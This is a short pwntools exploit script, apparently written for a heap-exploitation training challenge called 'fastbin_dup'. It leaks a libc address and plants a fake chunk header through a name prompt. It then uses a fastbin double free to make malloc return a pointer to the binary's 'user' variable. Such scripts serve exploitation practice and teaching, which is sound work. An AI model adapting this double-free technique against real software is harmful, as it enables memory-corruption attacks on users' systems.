 #!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("fastbin_dup")
libc = elf.libc
index = 0

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

def malloc(size, data):
    global index
    io.send("1")
    io.sendafter("malloc size: ", f"{size}")
    io.sendafter("malloc data: ", data)
    io.recvuntil("your option is: ")
    index += 1
    return index - 1 

def free(i):
    io.send("2")
    io.sendafter("index: ", str(i))
    io.recvuntil("your option is: ")


io = start()
io.recvuntil("puts @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts

io.recvuntil("Enter your name: ",)

# io.send('jc')
io.send(p64(0x00)+p64(0x21))

io.recvuntil("your option is: ")
io.timeout = 0.1


chunk_a = malloc(1, 'aaaa')
chunk_b = malloc(1, 'bbbb')

free(chunk_a)
free(chunk_b)
free(chunk_a)

chunk_c = malloc(1, p64(elf.sym.user))

malloc(1, 'a')
malloc(1, 'a')
malloc(1, 'hello')



io.interactive()
